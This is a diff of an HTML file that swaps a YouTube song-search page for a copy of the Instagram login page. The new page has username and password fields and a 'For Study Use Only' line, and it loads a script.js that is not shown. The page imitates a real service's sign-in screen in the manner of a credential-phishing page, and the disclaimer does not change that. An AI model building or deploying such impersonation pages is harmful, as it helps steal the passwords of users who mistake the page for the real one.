@@ -1,22 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>YouTube Song Search</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <h2>🎧 YouTube Song Search & Play</h2>
-  <input type="text" id="songInput" placeholder="Type any song name">
-  <button onclick="searchAndPlay()">Search & Play</button>
-
-  <div id="player">
-    <iframe id="ytplayer" width="90%" height="400" frameborder="0"
-      allow="autoplay; encrypted-media" allowfullscreen>
-    </iframe>
+  <div class="login-container">
+    <h2>Instagram</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Phone number, username or email" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <p class="info">For Study Use Only</p>
   </div>
-
   <script src="script.js"></script>
 </body>
 </html>
